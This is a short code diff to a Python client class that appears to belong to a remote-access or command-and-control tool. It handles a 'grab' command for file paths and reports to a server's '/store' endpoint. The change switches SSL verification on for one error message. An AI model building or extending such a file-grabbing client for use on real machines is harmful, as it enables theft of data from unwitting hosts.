@@ -57,7 +57,7 @@ class Client:
         try:
             grab, path = command.strip().split(' ')
         except ValueError:
-            self.send_post("[-] Invalid grab command (maybe multiple spaces)", url=f'https://{self.server_ip}:{self.https_port}/store', verify_ssl=False)
+            self.send_post("[-] Invalid grab command (maybe multiple spaces)", url=f'https://{self.server_ip}:{self.https_port}/store', verify_ssl=True)
             return
 
         if not os.path.exists(path):
